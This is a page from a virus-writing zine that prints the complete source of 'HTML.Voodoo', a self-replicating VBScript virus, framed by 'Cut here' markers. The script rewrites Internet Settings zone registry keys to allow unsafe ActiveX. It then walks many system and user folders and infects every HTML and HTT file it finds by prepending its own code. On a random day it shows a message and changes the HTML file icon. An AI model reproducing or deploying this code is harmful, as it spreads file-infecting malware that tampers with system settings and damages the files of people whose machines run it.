- [Duke's Virus Labs #7] - [Page 13] -

HTML.Voodoo
(c) by ULTRAS

===== Cut here =====
<!--Voodoo-->
<html><body>
<script Language="VBScript"><!--
' HTML.Voodoo
On Error Resume Next
if location.protocol = "file:" then
Randomize
Set WshShell = CreateObject("WScript.Shell")
WshShell.Regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
if location.protocol = "file:" then
Set FSO = CreateObject("Scripting.FileSystemObject")
HPath = Replace(location.href, "/", "\")
HPath = Replace(HPath, "file:\\\", "")
HPath = FSO.GetParentFolderName(HPath)
Set TRange = document.body.createTextRange
Call GetFolder(HPath)
Call GetFolder("C:\")
Call GetFolder("C:\Windows\Desktop")
Call GetFolder("C:\Windows\Web")
Call GetFolder("C:\Windows\Web\Wallpaper")
Call GetFolder("C:\Windows\Help")
Call GetFolder("C:\Windows\Temp")
Call GetFolder("C:\My Documents")
Call GetFolder("C:\Program Files\Microsoft Office\Office\Headers")
Call GetFolder("C:\Program Files\Internet Explorer\Connection Wizard")
Call GetFolder("C:\Inetpub\wwwroot")
end if
p = Int(Rnd * 30) + 1
If Day(Now()) = p Then
MsgBox("Voodoo by ULTRAS"), vbCritical
WshShell.RegWrite "HKEY_CLASSES_ROOT\htmlfile\DefaultIcon\", "C:\Win98\System\Shell32.dll,32"
End If
Sub GetFolder(InfPath)
On Error Resume Next
if FSO.FolderExists(InfPath) then
Do
Set FolderObj = FSO.GetFolder(InfPath)
InfPath = FSO.GetParentFolderName(InfPath)
Set FO = FolderObj.Files
For each target in FO
ExtName = lcase(FSO.GetExtensionName(target.Name))
if ExtName = "htt" or ExtName = "htm" or ExtName = "html" then
Set Real = FSO.OpenTextFile(target.path, 1, False)
if Real.readline <> "<!--Voodoo-->" then
Real.close()
GetFile(target.path)
else
Real.close()
end if
end if
next
Loop Until FolderObj.IsRootFolder = True
end if
End Sub
Sub GetFile(GetFileName)
Set Real = FSO.OpenTextFile(GetFileName, 1, False)
FileContents = Real.ReadAll()
Real.close()
Set Real = FSO.OpenTextFile(GetFileName, 2, False)
Real.WriteLine "<!--Voodoo-->"
Real.Write("<html><body>" + Chr(13) + Chr(10))
Real.WriteLine TRange.htmlText
Real.WriteLine("</body></html>")
Real.Write(FileContents)
Real.close()
End Sub
end if
--></script>
=
===== Cut here =====
